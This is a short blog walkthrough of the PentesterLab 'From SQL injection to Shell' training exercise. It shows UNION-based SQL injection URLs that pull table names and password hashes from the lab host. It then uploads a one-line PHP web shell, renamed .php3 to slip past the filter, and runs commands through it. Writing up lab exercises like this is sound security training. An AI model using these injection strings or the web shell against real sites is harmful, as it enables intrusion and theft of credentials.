---
title: "Pentester Lab: From SQL injection to Shell -walkthrough"
date: 2020-06-22T20:48:38+05:30
draft: true
---
### About release 
- Name: Pentester Lab: From SQL injection to Shell
- Date release: 13 Sep 2012

- Author: Pentester Lab
- Series: Pentester Lab
- Web page: http://www.pentesterlab.com/exercises/from_sqli_to_shell/  

This machine was hosted on  pentesterlab.com.The goal was to teach how to exploit sql injection and gain administrator access.  

Before Going to exploits we should know some basics about sqli.   
SQL injection is a  vulnerability where an attacker interferes with the queries that an application makes to its database.  
If user input is not sanitized the attacker can inject sql commands in server.  
&nbsp;

In this blog post, i will perform sql injection and perform file upload to get shell access.     
First step was to know the ip address of your machine.if you use linux  you can know your ip address through ipconfig command.


Now, to identify  the services running on our ip address we use a software called nmap.

` nmap 192.168.42.0/24 `  

the above command scans a subnet.  
&nbsp;


![nmap output](/sqlitoshell/nmap-output.png) 


We can see http open on port 80 .
If we visit that we can see a website with title "My Awesome Photoblog".
Clicking on test we can see the url as "http://192.168.42.211/cat.php?id=1"  

The parameter id was a source of sql injection .You can verify that by typing quote next to parameter and it shows error .  
Now type " order by 1" next to id and it shows same output with no error message .  

Keep incrementing order by value till you get error .

Error occurs when you type ORDER BY 5 which means to request 4 column from database.

![order by error](/sqlitoshell/orderby.png)   
&nbsp;

now to get list of table name form the form our database we need to request TABLE_NAME from INFORMATION__SCHEMA.TABLES  

```http://192.168.42.211/cat.php?id=2 union select 1,TABLE_NAME,3,4 from INFORMATION_SCHEMA.TABLES```   
&nbsp;

![information schema](/sqlitoshell/INFO-SCHEMA.jpg)  
    
&nbsp;

Now we know there is a table called users .
similarly get the COLUMN_NAME  from table users .
we get 3 columns - id,login ,password .
Similarly we can retrieve password by using the following url  
```"http://192.168.42.211/cat.php?id=2 union select 1,password,3,4 from users" ```

&nbsp;

The password is hashed before storage . This  was md5 hash adn on decrypting we can see the password is "P4ssw0rd".  
We can get the login from users table.  
Login with te credential odbtained in admin page   
![admin page](/sqlitoshell/admin.jpg)  
we have upload image section .

for exploiting this we can use very simple php code.   
```&nbsp;

<?php  
  system($_GET['cmd']);  
?>
```  
Now we can execute commands in server through get parameter.  
upload doesnt accept php files but php3 works fine 

Using following url we can use ls on server 

```http://192.168.42.211/admin/uploads/exploit1.php3?cmd=%22ls%22```

&nbsp;

![exploit](/sqlitoshell/exploit-success.png)   
&nbsp;


These kind of vulnerablilty are hard to find in modern websites but still they are rarely available in internet today. 
we can do some privilage escalation to get root access.